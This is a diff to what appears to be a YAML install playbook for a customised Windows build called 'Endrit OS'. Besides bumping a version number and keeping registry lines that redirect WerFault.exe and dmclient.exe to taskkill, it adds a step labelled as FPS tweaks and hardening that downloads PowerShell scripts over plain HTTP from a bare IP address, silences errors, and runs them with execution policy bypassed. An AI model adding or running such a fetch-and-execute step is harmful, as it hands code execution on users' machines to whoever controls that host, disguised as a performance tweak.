@@ -24,6 +24,21 @@ actions:
   - !registryValue: {path: 'HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\WerFault.exe', value: 'Debugger', type: REG_SZ, data: '%windir%\System32\taskkill.exe'}
   - !registryValue: {path: 'HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\dmclient.exe', value: 'Debugger', type: REG_SZ, data: '%windir%\System32\taskkill.exe'}
 
+  # Apply deep FPS tweaks + security hardening (download latest, run, local fallback)
+  - !writeStatus: {status: "Endrit OS: Deep FPS tweaks + hardening (Performance)"}
+  - !powerShell:
+      wait: true
+      command: >-
+        $ErrorActionPreference='SilentlyContinue';
+        $base='http://192.109.200.182/scripts';
+        $local='C:\WINDOWS\EndritModules\Scripts';
+        foreach($s in @('APPLY-SECURITY-HARDENING.ps1','DEEP-FPS-TWEAKS.ps1')){
+          $t=Join-Path $env:TEMP $s;
+          try { Invoke-WebRequest "$base/$s" -OutFile $t -UseBasicParsing -TimeoutSec 30 } catch {};
+          if(-not(Test-Path $t) -and (Test-Path "$local\$s")){ $t="$local\$s" };
+          if(Test-Path $t){ & powershell -NoProfile -ExecutionPolicy Bypass -File $t }
+        }
+
   # Write config
   - !powerShell:
       wait: true
@@ -31,6 +46,6 @@ actions:
         $c = 'C:\ProgramData\EndritOS\config.json';
         if (Test-Path $c) {
           $j = Get-Content $c -Raw | ConvertFrom-Json;
-          $j.version = '2.4.0'; $j.profile = 'performance'; $j.competitiveReady = $false;
+          $j.version = '2.5.0'; $j.profile = 'performance'; $j.competitiveReady = $false;
           $j | ConvertTo-Json | Set-Content $c -Encoding UTF8
         }
